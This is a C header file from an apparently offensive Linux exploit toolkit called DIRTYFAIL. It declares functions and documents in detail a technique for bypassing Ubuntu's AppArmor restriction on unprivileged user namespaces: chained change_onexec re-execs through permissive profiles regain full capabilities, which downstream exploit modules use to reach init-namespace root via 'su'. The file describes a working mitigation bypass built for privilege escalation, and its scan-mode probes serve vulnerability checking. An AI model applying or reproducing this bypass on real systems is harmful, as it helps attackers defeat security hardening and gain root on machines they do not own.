/*
 * DIRTYFAIL — apparmor_bypass.h
 *
 * Defeat Ubuntu's `apparmor_restrict_unprivileged_userns=1` policy.
 *
 * The default Ubuntu apparmor profile applied to unprivileged programs
 * lets `unshare(CLONE_NEWUSER)` succeed but **strips CAP_NET_ADMIN**
 * inside the new namespace — so XFRM SA registration, raw sockets, etc.
 * fail downstream even though we appear to be uid 0 in our userns.
 *
 * The bypass: switch to a permissive AppArmor profile (`crun`, `chrome`,
 * etc.) via `change_onexec` *before* unshare. Those profiles don't
 * carry the userns-cap-strip rule, so the kernel hands us the full
 * effective set inside the new namespace.
 *
 * Mechanics — three stages, two re-execs:
 *
 *   stage 0 (entry):   change_onexec(crun);   execv(self, AA1, ...args)
 *   stage 1 (in crun): change_onexec(chrome); execv(self, AA2, ...args)
 *   stage 2 (in chrome): unshare(USER|NET); maps; capset; ambient caps;
 *                        re-enter normal main() flow with bypass marked
 *
 * The two-hop dance is what `aa-rootns` (Brad Spengler / 0xdeadbeef)
 * demonstrated. The "chrome" hop is technically optional — the "crun"
 * profile is already unconfined for our purposes — but the second hop
 * defeats some hardened policies that audit chained execs.
 *
 * Detection of "do we need the bypass?" is best-effort:
 *   - read /proc/self/attr/current; if it ends with " (enforce)" and
 *     mentions "unprivileged_userns", we're being restricted.
 *   - or: probe by spawning a child that does unshare(CLONE_NEWUSER)
 *     and tries `ip link add type dummy` — if that fails with EPERM,
 *     the caps were stripped.
 */

#ifndef DIRTYFAIL_APPARMOR_BYPASS_H
#define DIRTYFAIL_APPARMOR_BYPASS_H

#include "common.h"

/* Stage markers used as argv[1] to route re-execs. */
#define AA_STAGE1_TAG "DIRTYFAIL-AA-STAGE-1"
#define AA_STAGE2_TAG "DIRTYFAIL-AA-STAGE-2"

/* Returns true if `argv[1]` is one of the AA-* stage markers, in which
 * case main() should hand control to apparmor_bypass_run_stage(). */
bool apparmor_bypass_is_stage(int argc, char **argv);

/* Execute the appropriate stage based on argv[1]. This either re-execs
 * self (stage 1) or returns the modified argv after unshare+caps setup
 * for the caller to continue with (stage 2). The function does not
 * return on stage 1 (always execv). On stage 2, returns 0 on success
 * and writes the caller's continuation argv to *out_argc / *out_argv. */
int apparmor_bypass_run_stage(int argc, char **argv,
                              int *out_argc, char ***out_argv);

/* Probe: does this process actually need the bypass to gain
 * CAP_NET_ADMIN inside a fresh user namespace? Returns true if YES. */
bool apparmor_bypass_needed(void);

/* True iff stage 2 of the bypass ran successfully in this process —
 * i.e. we're now inside a fresh user/net namespace with full caps,
 * and any further unshare() would nest. Exploit modules check this
 * before deciding whether to fork+unshare on their own. */
bool apparmor_bypass_was_armed(void);

/* Probe whether the bypass actually grants caps on this kernel.
 * Forks a child that does unshare(USER) and tries to write to
 * /proc/self/setgroups; if that fails with EPERM, we're on a kernel
 * (Ubuntu 26.04+) that auto-transitions to the unprivileged_userns
 * sub-profile and denies caps regardless of bypass technique.
 *
 * Returns true if unprivileged userns is COMPREHENSIVELY blocked
 * (the bug class is unreachable for unprivileged users). Returns
 * false if userns operations work normally OR if AA isn't loaded
 * at all (in which case `apparmor_bypass_needed()` would also
 * return false).
 *
 * This is the right signal for `--scan` to report "VULNERABLE in
 * kernel but LSM-mitigated" vs plain "VULNERABLE".
 */
bool apparmor_userns_caps_blocked(void);

/* Fork a child that arms the AA bypass and re-execs itself through
 * the stages. The child eventually lands inside a fresh user/net
 * namespace with full caps; main() in that re-exec'd image dispatches
 * to the inner-mode handler indicated by the DIRTYFAIL_INNER_MODE
 * environment variable.
 *
 * The PARENT stays in the init namespace and waits for the child via
 * waitpid. After the child exits, the parent can read the global
 * page cache (which reflects whatever the child modified) and then
 * execlp("su", ...) in init namespace to reach REAL init-ns root —
 * this is the whole point of the outer/inner split.
 *
 * Caller must setenv("DIRTYFAIL_INNER_MODE", "...", 1) and any other
 * mode-specific env vars BEFORE calling this. The child inherits the
 * full environment.
 *
 * Returns the child's exit code on success. -1 on fork failure. */
int apparmor_bypass_fork_arm(int argc, char **argv);

/* Trigger the bypass: change_onexec(crun) then re-exec self with stage
 * markers. Caller passes the argv it wants to resume with (stage 2 will
 * hand that argv back via apparmor_bypass_run_stage's out_argv).
 *
 * Does not return on success (control transfers to the new process
 * image). Returns -1 with errno set if the change_onexec or execv
 * failed; in that case the caller may continue without bypass and let
 * downstream syscalls fail loudly. */
int apparmor_bypass_arm_and_relaunch(int argc, char **argv);

#endif
